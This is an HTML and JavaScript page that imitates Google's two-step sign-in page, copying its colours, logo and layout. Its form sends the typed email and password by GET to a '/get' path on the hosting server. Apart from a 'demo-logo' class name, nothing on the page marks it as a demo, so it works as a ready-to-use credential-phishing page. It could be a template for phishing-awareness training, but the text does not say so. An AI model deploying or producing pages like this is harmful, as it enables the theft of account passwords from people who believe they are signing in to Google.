<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign In with Google</title>

  <style>
    :root {
      --bg: #f6f8fc;
      --card: #ffffff;
      --text: #202124;
      --muted: #5f6368;
      --line: #dadce0;
      --blue: #0b57d0;
      --blue-hover: #0842a0;
      --danger: #d93025;
      --shadow: 0 12px 36px rgba(60, 64, 67, 0.18);
    }

    * {
      box-sizing: border-box;
    }

    html,
    body {
      margin: 0;
      width: 100%;
      min-height: 100%;
      font-family: Arial, Helvetica, sans-serif;
      background: var(--bg);
      color: var(--text);
    }

    body {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .page {
      width: 100%;
      min-height: 100vh;
      padding: 20px 16px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .login-container {
      width: 100%;
      max-width: 420px;
      background: var(--card);
      border-radius: 28px;
      box-shadow: var(--shadow);
      overflow: hidden;
    }

    .form-slider {
      display: flex;
      width: 100%;
      transition: transform 500ms ease;
    }

    .login-container.password-mode .form-slider {
      transform: translateX(-100%);
    }

    .step {
      width: 100%;
      min-width: 100%;
      min-height: 430px;
      padding: 42px;
      flex-shrink: 0;
    }

    .demo-logo {
      width: 75px;
      height: 24px;
      margin-bottom: 28px;
      display: flex;
      align-items: center;
      font-size: 22px;
      font-weight: 700;
      letter-spacing: -1px;
    }

    .demo-logo span:nth-child(1) {
      color: #4285f4;
    }

    .demo-logo span:nth-child(2) {
      color: #ea4335;
    }

    .demo-logo span:nth-child(3) {
      color: #fbbc05;
    }

    .demo-logo span:nth-child(4) {
      color: #4285f4;
    }

    .demo-logo span:nth-child(5) {
      color: #34a853;
    }

    .demo-logo span:nth-child(6) {
      color: #ea4335;
    }

    h1 {
      margin: 0;
      font-size: 36px;
      line-height: 1.12;
      font-weight: 400;
      letter-spacing: -0.6px;
    }

    h2 {
      margin: 14px 0 0;
      font-size: 16px;
      line-height: 1.45;
      font-weight: 400;
      color: #3c4043;
    }

    .field {
      position: relative;
      margin-top: 42px;
    }

    .g-input {
      width: 100%;
      height: 56px;
      border: 1px solid var(--line);
      border-radius: 4px;
      padding: 18px 14px 8px;
      font-size: 16px;
      outline: none;
      background: transparent;
      transition: border-color 150ms ease, box-shadow 150ms ease;
    }

    .g-input:focus {
      border-color: var(--blue);
      box-shadow: 0 0 0 1px var(--blue);
    }

    .field label {
      position: absolute;
      top: 18px;
      left: 12px;
      padding: 0 4px;
      font-size: 16px;
      color: var(--muted);
      background: var(--card);
      pointer-events: none;
      transform-origin: left top;
      transition: transform 150ms ease, color 150ms ease;
    }

    .g-input:focus + label,
    .g-input:not(:placeholder-shown) + label {
      transform: translateY(-28px) scale(0.78);
      color: var(--blue);
    }

    .helper-link {
      margin-top: 10px;
      color: var(--blue);
      font-size: 14px;
      font-weight: 600;
    }

    .info-text {
      margin-top: 34px;
      color: var(--muted);
      font-size: 14px;
      line-height: 1.45;
    }

    .actions {
      display: flex;
      justify-content: flex-end;
      align-items: center;
      gap: 18px;
      margin-top: 38px;
    }

    button {
      min-height: 44px;
      font: inherit;
      cursor: pointer;
      touch-action: manipulation;
    }

    .text-btn {
      border: 0;
      background: transparent;
      color: var(--blue);
      font-weight: 600;
      padding: 10px 4px;
    }

    .gbtn-primary {
      border: 0;
      border-radius: 999px;
      background: var(--blue);
      color: white;
      font-weight: 600;
      padding: 10px 24px;
      transition: background 150ms ease, transform 150ms ease;
    }

    .gbtn-primary:hover {
      background: var(--blue-hover);
    }

    .gbtn-primary:active {
      transform: scale(0.98);
    }

    .error {
      display: none;
      margin-top: 8px;
      color: var(--danger);
      font-size: 13px;
    }

    .error.show {
      display: block;
    }

    .account-chip {
      display: inline-flex;
      align-items: flex-start;
      gap: 10px;
      max-width: 100%;
      min-height: 34px;
      margin-top: 20px;
      padding: 6px 12px 6px 6px;
      border: 1px solid var(--line);
      border-radius: 16px;
      color: #3c4043;
      font-size: 14px;
    }

    .avatar {
      width: 24px;
      height: 24px;
      border-radius: 50%;
      display: grid;
      place-items: center;
      flex-shrink: 0;
      background: var(--blue);
      color: white;
      font-size: 13px;
      font-weight: 700;
    }

    .chip-email {
      white-space: normal;
      overflow-wrap: anywhere;
      word-break: break-word;
      line-height: 1.3;
    }

    .show-password-row {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-top: 16px;
      font-size: 14px;
      color: var(--text);
      min-height: 44px;
    }

    .show-password-row input {
      width: 18px;
      height: 18px;
      margin: 0;
    }

    .complete-message {
      display: none;
      margin-top: 14px;
      color: var(--muted);
      font-size: 14px;
      line-height: 1.45;
    }

    .complete-message.show {
      display: block;
    }

    @media (max-width: 520px) {
      body {
        align-items: stretch;
      }

      .page {
        align-items: flex-start;
        padding: 0;
        background: var(--card);
      }

      .login-container {
        max-width: none;
        min-height: 100vh;
        border-radius: 0;
        box-shadow: none;
      }

      .step {
        min-height: 100vh;
        padding: 36px 24px 28px;
      }

      h1 {
        font-size: 32px;
      }

      .field {
        margin-top: 44px;
      }

      .actions {
        justify-content: space-between;
        gap: 10px;
        margin-top: 36px;
      }

      .text-btn {
        padding-left: 0;
      }

      .gbtn-primary {
        padding-left: 22px;
        padding-right: 22px;
      }
    }

    @media (max-width: 360px) {
      .step {
        padding-left: 18px;
        padding-right: 18px;
      }

      h1 {
        font-size: 29px;
      }

      .actions {
        gap: 6px;
      }

      .gbtn-primary {
        padding-left: 18px;
        padding-right: 18px;
      }
    }
  </style>
</head>

<body>
  <main class="page">
    <div class="login-container" id="loginContainer">
      <form id="email-form-step" action="/get">
        <div class="form-slider">

          <!-- EMAIL STEP -->
          <section class="step email-step" aria-label="Email step">
            <div class="demo-logo" aria-hidden="true">
              <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
            </div>

            <h1>Sign in</h1>
            <h2>Use your Google Account</h2>

            <div class="field">
              <input
                id="email"
                name="email"
                type="text"
                class="g-input"
                placeholder=" "
                autocomplete="off"
                required
              />
              <label for="email">Email or phone</label>

              <div class="error" id="emailError">
                Enter an email address to continue.
              </div>
            </div>

            <div class="helper-link">Forgot email?</div>

            <p class="info-text">
              Not your computer? Sign in in Guest Mode
            </p>

            <div class="helper-link">
              Learn more about Guest mode
            </div>

            <div class="actions">
              <button class="text-btn" type="button">Create account</button>
              <button class="gbtn-primary" id="emailNext" type="button">
                Next
              </button>
            </div>
          </section>

          <!-- PASSWORD STEP -->
          <section class="step password-step" aria-label="Password step">
            <div class="demo-logo" aria-hidden="true">
              <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
            </div>

            <h1>Welcome</h1>

            <div class="account-chip">
              <span class="avatar" id="avatar">G</span>
              <span class="chip-email" id="chipEmail">Guest User</span>
            </div>

            <div class="field">
              <input
                id="password"
                name="password"
                type="password"
                class="g-input"
                placeholder=" "
                autocomplete="off"
                required
              />
              <label for="password">Enter your password</label>
            </div>

            <label class="show-password-row">
              <input id="showPassword" type="checkbox" />
              Show password
            </label>

            <p class="info-text">
              
            </p>

            <div class="complete-message" id="completeMessage">
              
            </div>

            <div class="actions">
              <button class="text-btn" id="backButton" type="button">
                Back
              </button>

              <button class="gbtn-primary" id="passwordNext" type="submit">
                Next
              </button>
            </div>
          </section>

        </div>
      </form>
    </div>
  </main>

  <script>
    const loginContainer = document.getElementById("loginContainer");

    const emailInput = document.getElementById("email");
    const passwordInput = document.getElementById("password");

    const emailNext = document.getElementById("emailNext");
    const passwordNext = document.getElementById("passwordNext");
    const backButton = document.getElementById("backButton");

    const emailError = document.getElementById("emailError");
    const chipEmail = document.getElementById("chipEmail");
    const avatar = document.getElementById("avatar");

    const showPassword = document.getElementById("showPassword");
    const completeMessage = document.getElementById("completeMessage");

    function goToPasswordStep() {
      const email = emailInput.value.trim();

      if (!email) {
        emailError.classList.add("show");
        emailInput.focus();
        return;
      }

      emailError.classList.remove("show");

      chipEmail.textContent = email;
      avatar.textContent = email.charAt(0).toUpperCase();

      loginContainer.classList.add("password-mode");

      setTimeout(function () {
        passwordInput.focus();
      }, 500);
    }

    function goToEmailStep() {
      loginContainer.classList.remove("password-mode");
      completeMessage.classList.remove("show");

      setTimeout(function () {
        emailInput.focus();
      }, 500);
    }

    emailNext.addEventListener("click", goToPasswordStep);

    emailInput.addEventListener("keydown", function (event) {
      if (event.key === "Enter") {
        goToPasswordStep();
      }
    });

    backButton.addEventListener("click", goToEmailStep);

    showPassword.addEventListener("change", function () {
      if (showPassword.checked) {
        passwordInput.type = "text";
      } else {
        passwordInput.type = "password";
      }

      passwordInput.focus();
    });

    passwordNext.addEventListener("click", function () {
      completeMessage.classList.add("show");
    });

    passwordInput.addEventListener("keydown", function (event) {
      if (event.key === "Enter") {
        completeMessage.classList.add("show");
      }
    });
  </script>
</body>
</html>
